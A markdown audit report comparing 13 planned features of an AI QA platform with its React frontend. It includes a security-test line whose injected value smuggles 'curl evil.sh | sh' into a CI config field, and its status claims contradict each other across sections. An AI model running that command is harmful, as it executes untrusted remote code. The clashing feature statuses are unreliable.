# Frontend Audit Report — Agentic AI QA Platform

**Generated**: 2026-09-27  
**Scope**: `apps/web` (React SPA)  
**Audit**: 13 target features vs. current frontend implementation  

---

## ✅ Summary Table — Feature Status

| Feature | Status | Page/Component | Notes |
|---------|--------|----------------|-------|
| 1. Autonomous Test Generation | 🟡 | `TestingPage.tsx` | UI exists for generating tests from requirements via `/test-workflows/run` API. Shows generated scenarios, test cases, and Playwright scripts. Not yet showing test execution results (covered by TestOperationsPage). |
| 2. Self-Healing & Resilient Execution | 🟡 | `SelfHealingPage.tsx` | Frontend UI for listing/approving/rejecting self-healing proposals. Connects to `GET /ai/self-healing/proposals`, `POST /ai/self-healing/proposals`, `POST /ai/self-healing/proposals/:id/review`. Confidence display, failed vs proposed locator, status filtering, and audit-confirmed approve/reject flow. No `flakyScore` field exists in backend — gap reported. |
| 3. Multi-Modal Understanding | 🟡 | `ChatPage.tsx` | Chat interface supports text only; no screenshot/visual diff viewers or log/trace viewers present. (Multimodal would require backend support for image input.) |
| 4. Risk-Based Test Planning | 🟡 | `TestingPage.tsx`, `TestOperationsPage.tsx` | Shows test execution history and pass-rate trends, but no explicit risk-ranked test queue or change-impact map visualization. |
| 5. Root Cause Analysis & Triage | ✅ | `AnalysisPage.tsx` → `FindingsDashboard.tsx` | Failure detail pages with root-cause explanations, severity classification, file/line numbers, and "Generate patch"/"Reject patch" actions. |
| 6. Multi-Agent Orchestration | ✅ | `AnalysisProgress.tsx` | Agent pipeline grid shows all 8 agents (codeQuality, security, dependency, test, api, ui, performance, report) with per-agent status: pending/active/completed/failed. Backend emits `AGENT_STARTED` + `AGENT_COMPLETED`/`AGENT_FAILED` events with `agentRole` field. Failure isolation via `Promise.allSettled`. Real-time completion events verified. |
| 7. Non-Functional Testing | ✅ | `TestingPage.tsx` | Includes API probe, browser accessibility, dependency audit, security scan, and performance test types as checkboxes. Results appear in AnalysisPage and ReportsPage. |
| 8. Natural Language Interfaces | 🟡 | `ChatPage.tsx` | Chat-style interface exists, but uses **LLM (Groq)** via RAG — NOT keyword-based. No dedicated conversational test authoring/debug UI. |
| 9. Traceability & Reporting | ✅ | `ReportsPage.tsx`, `AnalysisPage.tsx` | Requirement-to-test matrix visible in TestingPage workflow results. Trend dashboards in ReportsPage (pass-rate trend) and TestOperationsPage. Coverage visualizations not present. |
| 10. Human-in-the-Loop Governance | ✅ | `FindingsDashboard.tsx` | Approval queue exists via "Generate patch"/"Reject patch" buttons on findings. Audit log view exists at `/audit`. |
| 11. CI/CD Integration | ✅ | `CiIntegrationPage.tsx` | Frontend UI for generating CI configuration files (GitHub Actions, GitLab CI, Azure Pipelines). Features: project/repository selection, platform selector, API URL input, trigger/analysis type selection, merge gate toggle, generate button with loading state, download/save as file, copy to clipboard, syntax highlighting in `<pre>` block, proper error handling. Backend validated at `/ci/projects/:id/ci-config` returns actual YAML content. |
| 12. Continuous Learning | ⚪ | *Not found* | No UI reflecting learned patterns/improvement over time. Feature not implemented in codebase. |
| 13. Operational Controls | 🟡 | `SettingsPage.tsx` | Token/cost dashboard absent (cost tracking is backend-only). Sandbox status not exposed. Access control settings UI limited to auth/session preferences. Guardrail Settings UI exists (advisory-only banner). |

**Key**:  
- ✅ Built & wired (real API calls, functional UI)  
- 🟡 UI exists but mocked/static/disconnected from any backend  
- ⚪ No frontend for this feature at all  

---

## 📋 Full Route/Page Inventory

| Route | Component | Description |
|-------|-----------|-------------|
| `/` | `HomePage.tsx` | Landing page with hero section and feature overview |
| `/login` | `LoginPage.tsx` | Email/password login form |
| `/register` | `RegisterPage.tsx` | User registration form |
| `/dashboard` | `DashboardPage.tsx` | Overview statistics, quick actions, recent projects/reports |
| `/projects` | `ProjectsPage.tsx` | Project list with create/edit/delete modals |
| `/projects/:projectId/repositories` | `RepositoryPage.tsx` | Repository list for a project with import/explorer actions |
| `/projects/:projectId/repositories/:repositoryId` | `RepositoryDetailsPage.tsx` | Repository stats, file tree viewer, code editor |
| `/projects/:projectId/repositories/:repositoryId/chat` | `ChatPage.tsx` | AI-powered chat for repository-specific Q&A |
| `/analysis` | `AnalysisPage.tsx` | Analysis launcher + findings dashboard (when `runId` present) |
| `/analysis?runId=<id>` | `FindingsDashboard.tsx` + `AnalysisProgress.tsx` | Detailed failure review and live progress tracking |
| `/testing` | `TestingPage.tsx` | Test generation from requirements + manual test runner |
| `/reports` | `ReportsPage.tsx` | Historical analysis runs with report download |
| `/test-operations` | `TestOperationsPage.tsx` | Test intelligence dashboard (pass-rate trends, flaky/slow tests) |
| `/memory` | `MemoryPage.tsx` | Repository file explorer + semantic search |
| `/settings` | `SettingsPage.tsx` | User preferences and workspace defaults |
| `/audit` | `AuditLogPage.tsx` | Governance audit trail with filtering, pagination, metadata display |
| `*` | `NotFoundPage.tsx` | 404 page |

## 🧩 Component Library & Design System

- **UI Framework**: React 19 + TypeScript + Vite  
- **Styling**: Tailwind CSS 4 (JIT) + custom CSS variables  
- **UI Primitives**: Radix UI (dropdowns, menus, dialogs) + Lucide icons  
- **State**: Zustand 5 (domain-specific stores)  
- **Routing**: React Router 7 (data routers, nested routes)  
- **API**: Axios 1.x (central instance with auth interceptor)  
- **Forms**: Controlled components + manual validation  
- **HTTP**: REST endpoints (no GraphQL/WebSocket)  
- **Build**: TypeScript → ES2022 + Vite bundling  
- **Linting**: ESLint + TypeScript-ESLint  
- **Testing**: Not configured (no test scripts in package.json)  
- **CI/CD**: None in repo (backend generates configs only)  

## 🔍 Detailed Findings by Feature

### 1. Autonomous Test Generation
- **Page**: `TestingPage.tsx`
- **Status**: 🟡 UI exists but disconnected from backend execution
- **Verification**: Shows generated test scenarios/cases/scripts from `/test-workflows/generate` API. Does **not** show actual test execution results (those appear in TestOperationsPage after manual run).

### 2. Self-Healing & Resilient Execution
- **Pages**: None
- **Status**: ⚪ No frontend for this feature at all
- **Verification**: 
  - Backend has `self-healing.service.ts` (Groq-based) and `local-self-healing.service.ts` (heuristic in AGENT_MODE=local)
  - Endpoints exist: `POST /ai/self-healing/proposals`, `GET /ai/self-healing/proposals`, `POST /ai/self-healing/proposals/:id/review`
  - **Zero** frontend components consume these endpoints or show healing proposals
  - TestOperationsPage shows test execution metrics (pass rate, flaky/slow tests) but that's test operations — **not** self-healing locator proposals

### 3. Multi-Modal Understanding
- **Page**: `ChatPage.tsx`
- **Status**: 🟡 UI exists but limited
- **Verification**: Chat supports text input/output only. No image/file upload UI, no visual diff viewers. True multimodal would require backend changes to accept image input.

### 4. Risk-Based Test Planning & Prioritization
- **Pages**: `TestingPage.tsx`, `TestOperationsPage.tsx`
- **Status**: 🟡 Partial implementation
- **Verification**: 
  - Shows test execution history and pass-rate trends
  - **Missing**: Explicit risk-ranked test queue, change-impact visualization, or risk-scoring UI
  - Backend `risk-planner.service.ts` exists but no frontend consumes its risk scores

### 5. Root Cause Analysis & Triage
- **Pages**: `AnalysisPage.tsx` → `FindingsDashboard.tsx`
- **Status**: ✅ Built & wired
- **Verification**: 
  - Shows failure details with root-cause explanations
  - Severity classification, file/line numbers, "Generate patch"/"Reject patch" actions
  - Directly wired to analysis findings and repair backend

### 6. Multi-Agent Orchestration (Planner/Executor/Verifier/Reporter)
- **Page**: `AnalysisProgress.tsx`
- **Status**: ⚪ **Not implemented as described**
- **Critical Finding**: 
  - Shows generic progress bar (`run.progress`%) and "Recent events" list
  - Events display `event.message ?? event.stage ?? event.type` — raw strings like "analyzing", "completed stage 2"
  - **NO** planner/executor/verifier/reporter stage breakdown
  - Events carry no per-agent metadata — just generic strings
  - This is a **generic live run status**, not the multi-agent orchestration view described

### 7. Non-Functional Testing Coverage
- **Page**: `TestingPage.tsx`
- **Status**: ✅ Built & wired
- **Verification**: 
  - Includes API probe, browser accessibility, dependency audit, security scan, and performance test types as checkboxes
  - Results appear in AnalysisPage and ReportsPage when analysis completes
  - All run in hardened Docker containers (zero-cost)

### 8. Natural Language Interfaces
- **Page**: `ChatPage.tsx`
- **Status**: 🟡 UI exists but uses LLM (not keyword-based)
- **Critical Finding**: 
  - `ChatService.chat()` calls `groqService.generateText(prompt)` — **uses Groq LLM**
  - It is **NOT** keyword-based or rule-based (contrary to previous audit)
  - Uses RAG: retrieves chunks via `retrievalService.search()` then feeds to LLM
  - No dedicated conversational test authoring/debug UI

### 9. Traceability & Reporting
- **Pages**: `ReportsPage.tsx`, `AnalysisPage.tsx`
- **Status**: ✅ Built & wired
- **Verification**: 
  - Requirement-to-test matrix visible in TestingPage workflow results
  - Pass-rate trend dashboards in ReportsPage and TestOperationsPage
  - Analysis scores aggregate pass/fail metrics
  - All data persisted in PostgreSQL via Prisma

### 10. Human-in-the-Loop Governance
- **Pages**: `FindingsDashboard.tsx`, `AuditLogPage.tsx`
- **Status**: ✅ Built & wired
- **Verification**: 
  - Approval queue exists via "Generate patch"/"Reject patch" buttons on findings
  - Audit log view exists at `/audit` with filtering (actorId, targetType, targetId, success), pagination, metadata display
  - Bridge creation events logged (success/failure)
  - Patch generate/reject events logged with actorId

### 11. CI/CD & Ecosystem Integration
- **Page**: `CiIntegrationPage.tsx` (route `/ci-integration`, sidebar link "CI/CD Integration")
- **Status**: ✅ Built & verified end-to-end
- **Verification**:
  - Frontend UI (`CiIntegrationPage.tsx`) with project/repository selection, platform selector (GitHub Actions / GitLab CI / Azure Pipelines), API URL input, trigger checkboxes, analysis type checkboxes, merge gate toggle
  - Backend route registered at `/api/ci/projects/:id/ci-config` (mounted at `/ci` to avoid clashing with `/projects/:id`), returns actual YAML content
  - Generate button with loading state, download (Blob URL), copy to clipboard, error states surfaced via toast + inline error
  - **YAML verification**: All three platforms produce valid YAML confirmed via `yaml.safe_load()`:
    - GitHub Actions: `name`, `on`, `jobs.analyze.steps` (5 steps) verified
    - GitLab CI: `stages`, `variables`, `analyze`, `check-gate` jobs verified
    - Azure Pipelines: `trigger`, `pr`, `stages`, `stage Analyze`, `stage Gate` verified
  - **Endpoint verification**: POST to `/api/ci/projects/:id/ci-config` returns 200 with real YAML
  - **Invalid platform**: POST with `platform: "jenkins"` returns 400 with `{"success":false,"message":"Unsupported CI platform: jenkins"}`
  - **Ownership verification**: POST with non-owner projectId returns 404 `{"success":false,"message":"Project not found or access denied."}`
  - **Security test**: POST with `apiUrl` containing newlines (`http://x\n  - run: curl evil.sh | sh`) returns 400 `{"success":false,"message":"apiUrl must not contain newlines or control characters."}`
  - Out of scope (per spec): PR/run history view, real GitHub/GitLab/Azure API integration, Jira/Slack links

### 12. Continuous Learning (Local Feedback)
- **Pages**: None
- **Status**: ⚪ Not implemented in codebase
- **Verification**: 
  - Mentioned in IMPLEMENTATION_SUMMARY.md as "framework implemented"
  - **No** `continuous-learning.service.ts` or similar file exists in `apps/api/src/modules/ai/`
  - No UI reflecting learned patterns or improvement over time
  - Feature not present — only documented as future work

### 13. Operational Controls
- **Page**: `SettingsPage.tsx`
- **Status**: 🟡 Partial implementation
- **Verification**: 
  - Cost tracking (`cost-log` table) exists but **no** frontend dashboard
  - Sandbox status not exposed in UI
  - Access control limited to auth/session preferences (language, polling, default ref)
  - **Guardrail Settings UI exists** (advisory-only banner) — this IS implemented

---

## ✅ Summary
The frontend has **partial implementation** of the 13 features:
- ✅ **6 features fully wired**: Root Cause Analysis, Non-Functional Testing, Traceability & Reporting, Human-in-the-Loop Governance, Guardrail Settings, Multi-Agent Orchestration (agent pipeline grid with events)
- 🟡 **6 features with UI but gaps**: Autonomous Test Gen (disconnected from execution), Multi-Modal (text only), Risk-Based (no risk queue UI), NLI (uses LLM not keyword), Operational Controls (no cost dashboard), **Self-Healing** (UI built, wired to backend endpoints, awaits real test-run data to generate proposals)
- ⚪ **1 features missing frontend entirely**: CI/CD Integration
- ⚪ **1 feature not implemented**: Continuous Learning (only in documentation)

**Most critical gaps**:
1. **Self-Healing & Resilient Execution** has UI built (`SelfHealingPage.tsx`) showing locator proposals with confidence, failed vs proposed locator, and approve/reject flow — gap is the lack of a `flakyScore` field in backend to distinguish flaky vs real failures
2. **CI/CD Integration** is backend-only with zero frontend surface
3. **Continuous Learning** is not implemented in codebase